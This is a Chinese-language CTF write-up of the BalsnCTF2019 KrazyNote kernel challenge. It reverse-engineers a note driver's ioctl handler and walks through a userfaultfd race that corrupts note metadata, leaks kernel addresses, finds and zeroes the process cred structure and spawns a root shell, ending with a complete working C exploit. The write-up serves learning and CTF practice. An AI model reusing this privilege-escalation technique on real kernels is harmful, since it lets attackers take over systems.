---
layout: post
title:  "BalsnCTF2019 KrazyNote"
date:   2020-3-30
desc: ""
keywords: ""
categories: [Binary]
tags: []
icon: icon-html
---

# BalsnCTF2019 KrazyNote

## note.ko

* init_module

  ```c
  __int64 __fastcall init_module(__int64 a1, __int64 a2)
  {
    _fentry__(a1, a2);
    buf = &buf_start;
    return misc_register(&dev);
  }
  ```

  dev

  ```
  .data:0000000000000620 dev             db  0Bh                 ; DATA XREF: init_module+5↑o
  .data:0000000000000620                                         ; cleanup_module+5↑o
  .data:0000000000000621                 db    0
  .data:0000000000000622                 db    0
  .data:0000000000000623                 db    0
  .data:0000000000000624                 db    0
  .data:0000000000000625                 db    0
  .data:0000000000000626                 db    0
  .data:0000000000000627                 db    0
  .data:0000000000000628                 dq offset aNote         ; "note"
  .data:0000000000000630                 dq offset unk_680
  .data:0000000000000638                 align 80h
  .data:0000000000000680 unk_680         db    0                 ; DATA XREF: .data:0000000000000630↑o
  ```

  file_operations在unk_680，全空，使用默认的操作函数

  ```c
  struct file_operations {
          struct module *owner;
          loff_t (*llseek) (struct file *, loff_t, int);
          ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
          ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
          ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
          ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t);
          int (*readdir) (struct file *, void *, filldir_t);
          unsigned int (*poll) (struct file *, struct poll_table_struct *);
          long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
          long (*compat_ioctl) (struct file *, unsigned int, unsigned long);
          int (*mmap) (struct file *, struct vm_area_struct *);
          int (*open) (struct inode *, struct file *);
          int (*flush) (struct file *, fl_owner_t id);
          int (*release) (struct inode *, struct file *);
          int (*fsync) (struct file *, loff_t, loff_t, int datasync);
          int (*aio_fsync) (struct kiocb *, int datasync);
          int (*fasync) (int, struct file *, int);
          int (*lock) (struct file *, int, struct file_lock *);
          ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);
          unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);
          int (*check_flags)(int);
          int (*flock) (struct file *, int, struct file_lock *);
          ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);
          ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);
          int (*setlease)(struct file *, long, struct file_lock **);
          long (*fallocate)(struct file *file, int mode, loff_t offset,loff_t len);
          int (*show_fdinfo)(struct seq_file *m, struct file *f);
  };
  ```

  ioctl使用unlocked_ioctl，unlocked_ioctl不使用内核提供的全局同步锁，存在条件竞争

* note

  ```c
  struct user_note
  {
  	unsigned __int64 idx;
  	unsigned __int64 size;
  	unsigned __int64 ptr;
  };
  struct note
  {
  	unsigned __int64 key;
  	unsigned __int64 size;
  	void *data_ptr;
  	char data[];
  };
  ```

  



* add edit show delete
  
  ```c
    signed __int64 __usercall op@<rax>(__int64 a1@<rbx>, __int64 a2@<rbp>, __int64 choice@<rsi>, __int64 a4@<r12>, __int64 a5@<rdi>)
  {
      __int64 v5; // rdx
      __int64 sz; // rcx
      __int64 __idx; // rax
      __int64 *store_ptr; // rax
      signed __int64 result; // rax
      __int64 index; // rax
      user_note *index_res; // rdx
      note *__note; // r8
      unsigned __int64 __sz; // rbp
      _DWORD *__data_ptr; // rsi
      unsigned __int64 j; // rax
      __int64 user_buf_; // r12
      note *_note; // rax
      unsigned __int64 _sz; // rbp
      __int64 v19; // r13
      _QWORD *_data_ptr; // r12
      _QWORD *v21; // rcx
      unsigned __int64 v22; // rax
      note *new_note; // rax
      note *note_data; // rbp
      size_t __size_; // r12
      __int64 _user_buf; // r13
      size_t _sz_; // rdx
      note *_new_note; // r12
      size_t i; // rax
      user_note *idx; // [rsp+0h] [rbp-140h]
      size_t size; // [rsp+8h] [rbp-138h]
      __int64 user_buf; // [rsp+10h] [rbp-130h]
      __int64 src[32]; // [rsp+18h] [rbp-128h]
      unsigned __int64 v34; // [rsp+118h] [rbp-28h]
      __int64 v35; // [rsp+120h] [rbp-20h]
      __int64 v36; // [rsp+128h] [rbp-18h]
      __int64 v37; // [rsp+130h] [rbp-10h]
    
      _fentry__(a5, choice);
      v37 = a4;
      v36 = a2;
      v35 = a1;
      idx = 0LL;
      size = 0LL;
      v34 = __readgsqword(0x28u);
      user_buf = 0LL;
      memset(src, 0, sizeof(src));
      if ( copy_from_user(&idx, v5, 24LL) )
        return -14LL;
      sz = size;
      __idx = idx & 0xF;
      idx = (idx & 0xF);
      size = size;
      if ( choice == -255 )
      {
        _note = note_store[__idx];
        if ( _note )
        {
          _sz = _note->size;
          v19 = user_buf;
          _data_ptr = _note->data_ptr + page_offset_base;
          _check_object_size(src, _sz, 0LL);
          copy_from_user(src, v19, _sz);
          if ( _sz )
          {
            v21 = note_store[idx];
            v22 = 0LL;
            do
            {
              src[v22 / 8] ^= *v21;
              v22 += 8LL;
            }
            while ( _sz > v22 );
            if ( _sz >= 8 )
            {
              *_data_ptr = src[0];
              *(_data_ptr + _sz - 8) = *(&src[-1] + _sz);
              result = 0LL;
              qmemcpy(
                ((_data_ptr + 1) & 0xFFFFFFFFFFFFFFF8LL),
                (src - (_data_ptr - ((_data_ptr + 1) & 0xFFFFFFFFFFFFFFF8LL))),
                8LL * ((_sz + _data_ptr - ((_data_ptr + 8) & 0xFFFFFFF8)) >> 3));
              return result;
            }
          }
          if ( _sz & 4 )
          {
            *_data_ptr = src[0];
            *(_data_ptr + _sz - 4) = *(src + _sz - 4);
            return 0LL;
          }
          if ( _sz )
          {
            *_data_ptr = src[0];
            if ( _sz & 2 )
              *(_data_ptr + _sz - 2) = *(src + _sz - 2);
          }
        }
        return 0LL;
      }
      if ( choice <= -255 )
      {
        if ( choice != -256 )
          return -25LL;
        idx = -1LL;
        index = 0LL;
        while ( 1 )
        {
          index_res = index;
          if ( !note_store[index] )
            break;
          if ( ++index == 16 )
            return -14LL;
        }
        new_note = buf;
        idx = index_res;
        note_store[index_res] = buf;
        *&new_note->size = sz;
        note_data = new_note + 1;
        new_note->key = *(*(__readgsqword(&current_task) + 2024) + 80LL);
        __size_ = size;
        _user_buf = user_buf;
        buf = &new_note[1] + size;
        if ( size > 0x100 )
        {
          _warn_printk("Buffer overflow detected (%d < %lu)!\n", 256LL, size);
          BUG();
        }
        _check_object_size(src, size, 0LL);
        copy_from_user(src, _user_buf, __size_);
        _sz_ = size;
        _new_note = note_store[idx];
        if ( size )
        {
          i = 0LL;
          do
          {
            src[i / 8] ^= _new_note->key;
            i += 8LL;
          }
          while ( i < _sz_ );
        }
        memcpy(note_data, src, _sz_);
        result = 0LL;
        _new_note->data_ptr = note_data - page_offset_base;
      }
      else
      {
        if ( choice != -254 )
        {
          store_ptr = note_store;
          if ( choice == -253 )
          {
            do
            {
              *store_ptr = 0LL;
              ++store_ptr;
            }
            while ( &_check_object_size != store_ptr );
            result = 0LL;
            buf = &buf_start;
            memset(&buf_start, 0, 0x2000uLL);
            return result;
          }
          return -25LL;
        }
        __note = note_store[__idx];
        result = 0LL;
        if ( __note )
        {
          __sz = __note->size;
          __data_ptr = __note->data_ptr + page_offset_base;
          if ( __sz >= 8 )
          {
            *(&src[-1] + __note->size) = *(__data_ptr + __note->size - 8);
            qmemcpy(src, __data_ptr, 8LL * ((__sz - 1) >> 3));
          }
          else if ( __sz & 4 )
          {
            LODWORD(src[0]) = *__data_ptr;
            *(src + __sz - 4) = *(__data_ptr + __sz - 4);
          }
          else if ( __note->size )
          {
            LOBYTE(src[0]) = *__data_ptr;
            if ( __sz & 2 )
              *(src + __sz - 2) = *(__data_ptr + __sz - 2);
          }
          if ( __sz )
          {
            j = 0LL;
            do
            {
              src[j / 8] ^= __note->key;
              j += 8LL;
            }
            while ( j < __sz );
          }
          user_buf_ = user_buf;
          _check_object_size(src, __sz, 1LL);
          copy_to_user(user_buf_, src, __sz);
          result = 0LL;
        }
      }
      return result;
    }
  ```
  
  从用户空间拷贝user_note，
  
  add -256 从buf分配sizeof(note)，从user_note->ptr拷贝key和data，key和data异或后存到note->data
  
  edit -255 修改note
  
  show -254 data和key异或后拷贝到用户空间
  
  delete -253 buf清空，指针指向开头
  
  
  
  

  
  
## exp

1. add(0x10)，note0

2. edit(0)，利用userfaultfd，进handler，停在`copy_from_user`

3. 在handler中delete，add(0) note0，add(0) note1

4. 继续执行`copy_from_user`，原来应从buf拷贝到note0中的data[0x10]，现在size为0，buf[8]会拷贝到note1的size，可以修改note1的size，实现越界读写

5. leak `key`，通过note1越界读，数据需要异或key，直接show(1)拿0 xor key

6. leak `module_base_offset`，add note2，show(1)，越界读拿note2的data_ptr，算出来`module_base-page_offset_base`，对note的操作都会加上`page_offset_base`，读写module中的数据可以直接用 `module_base_offset`

7. leak `page_offset_base`，edit(1)越界写改note2的data_ptr

   ```c
   .text:00000000000001F7                 mov     r12, cs:page_offset_base
   .text:00000000000001FE                 add     r12, [rax+10h]
   ```

   这里可以拿page_offset_base

   ```
   pwndbg> x/10gi 0xffffffffc02e6000+0x1f7
      0xffffffffc02e61f7:	mov    r12,QWORD PTR [rip+0xffffffffc77b5aa2]
                                                 #0xffffffff87a9bca0
      0xffffffffc02e61fe:	add    r12,QWORD PTR [rax+0x10]
      0xffffffffc02e6202:	mov    rsi,rbp
      0xffffffffc02e6205:	call   0xffffffff86e5a190
      0xffffffffc02e620a:	mov    rdx,rbp
      0xffffffffc02e620d:	mov    rsi,r13
      0xffffffffc02e6210:	mov    rdi,rbx
      0xffffffffc02e6213:	call   0xffffffff86f53e80
      0xffffffffc02e6218:	test   rbp,rbp
      0xffffffffc02e621b:	je     0xffffffffc02e6248
   ```

   rip为`0x1fe`

   ```
   pwndbg> x/10gx 0xffffffff87a9bca0
   0xffffffff87a9bca0:	0xffff919c80000000	0x0000000000000001
   ```

   到0xffffffff87a9bca0拿page_offset_base

8. leak `cred`，利用prctl的PR_SET_NAME，然后任意读找地址

9. 修改cred，起shell



```c
#define _GNU_SOURCE
#include <sys/types.h>
#include <stdio.h>
#include <stdint.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>


int fd;
size_t fault_ptr;
typedef struct _user_note{
    size_t idx;
    size_t length;
    size_t ptr;
}user_note;

void print_hex(char *buf,int size){
    int i;
    puts("======================================");
    for (i=0 ; i<(size/8);i++){
        printf(" %16llx ",*(size_t *)(buf + i*8));
        if (i%2 == 1)
            printf("\n");
    }          
    puts("======================================");
}

void add(int fd,size_t buf,size_t length){
    user_note p;
    p.length  = length;
    p.ptr = buf;
    ioctl(fd, -256, &p);
}

void edit(int fd,size_t idx,size_t buf, size_t length){
    user_note p;
    p.length  = length;
    p.ptr = buf;
    p.idx = idx;
    ioctl(fd, -255, &p);
}

void show(int fd,size_t idx,size_t buf){
    user_note p;
    p.ptr = buf;
    p.idx = idx;
    ioctl(fd, -254, &p);
}

void delete(int fd){
    user_note p;
    ioctl(fd, -253, &p);
}

void errExit(char* msg){
    puts(msg);
    exit(-1);
}

static void * fault_handler_thread(void *arg){
    long uffd; 
    struct uffdio_copy uffdio_copy;
    uffd = (long) arg;
    int page_size = 0x1000;
    struct pollfd pollfd;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    int nready;
    nready = poll(&pollfd, 1, -1);
    if (nready == -1)
        errExit("poll");

    char b[0x10];
    delete(fd);
    add(fd,b,0);
    add(fd,b,0);
    b[8] = 0xff; 

    uffdio_copy.src = (unsigned long)b;
    uffdio_copy.dst = (unsigned long)fault_ptr;
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
        errExit("ioctl-UFFDIO_COPY");
    printf("        (uffdio_copy.copy returned %lld)\n",
        uffdio_copy.copy);
}

size_t register_userfault(){
   long uffd;        
   char *addr;       
   size_t len = 0x1000;
   pthread_t thr; 
   struct uffdio_api uffdio_api;
   struct uffdio_register uffdio_register;
   int s;
   uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
   if (uffd == -1)
       errExit("userfaultfd");

   uffdio_api.api = UFFD_API;
   uffdio_api.features = 0;
   if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
       errExit("ioctl-UFFDIO_API");
   addr = mmap(NULL, len, PROT_READ | PROT_WRITE,
               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
   if (addr == MAP_FAILED)
       errExit("mmap");

   printf("Address returned by mmap() = %p\n", addr);
   uffdio_register.range.start = (size_t) addr;
   uffdio_register.range.len = len;
   uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
   if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
       errExit("ioctl-UFFDIO_REGISTER");

   s = pthread_create(&thr, NULL, fault_handler_thread, (void *) uffd);
   if (s != 0) {
       errno = s;
       errExit("pthread_create");
   }
   return addr;
}



int main(int argc, char const *argv[]){
    fd = open("/dev/note", 0);
    char *buf = malloc(0x1000);
    size_t *fake_note = (size_t *)buf;
    add(fd,buf, 0x10);
    fault_ptr = register_userfault();
    edit(fd,0,fault_ptr,0x10);
    show(fd,1,buf);
    size_t key = *(size_t *)buf; 
    printf("key=0x%lx\n",key);
    add(fd,buf,0);
    show(fd,1,buf);      
    size_t bss_addr = *(size_t *)(buf + 0x10) ^ key;
    size_t module_offset = bss_addr - 0x2568;
    printf("module_offset=0x%lx\n", module_offset);


    fake_note[0] = 0 ^ key;
    fake_note[1] = 4 ^ key;
    fake_note[2] = (module_offset+0x1fa) ^ key;
    edit(fd,1, buf, 0x18);
    int page_offset_base_offset;
    show(fd,2,buf);
    page_offset_base_offset = *(int *)buf;

    fake_note[0] = 0 ^ key;
    fake_note[1] = 8 ^ key;
    fake_note[2] = (module_offset + 0x1fe + page_offset_base_offset) ^ key;
    edit(fd,1, buf, 0x18);
    size_t page_offset_base;
    show(fd,2,buf);
    page_offset_base = *(size_t *)buf;
    printf("page_offset_base=0x%lx\n", page_offset_base);


    prctl(PR_SET_NAME, "aaaaaaaa");
    size_t *found;
    size_t offset = 0;
    size_t cred_ptr = 0;
    while(!cred_ptr){
        fake_note[0] = 0 ^ key;
        fake_note[1] = 0xff ^ key;
        fake_note[2] = offset ^ key;
        edit(fd,1, buf, 0x18);
        memset(buf, 0, 0x100);
        show(fd,2, buf);
        found = (size_t*)memmem(buf, 0x100, "aaaaaaaa", 0x8);
        if (found != NULL){
            if (found[-1] > 0xffff000000000000)
                cred_ptr = found[-1];
        }
        offset += 0x100;
    }
    printf("cred_ptr=0x%lx\n",cred_ptr);
    fake_note[0] = 0 ^ key;
    fake_note[1] = 0x20 ^ key;
    fake_note[2] = (cred_ptr - page_offset_base) ^ key;
    edit(fd,1,buf,0x18);
    show(fd,2,buf);
    print_hex(buf,0x100);
    char cred[0x30];
    memset(cred, 0, sizeof(cred));
    edit(fd,2,cred, 0x20);
    show(fd,2,buf);
    print_hex(buf,0x100);
    system("/bin/sh");
    return 0;
}

```



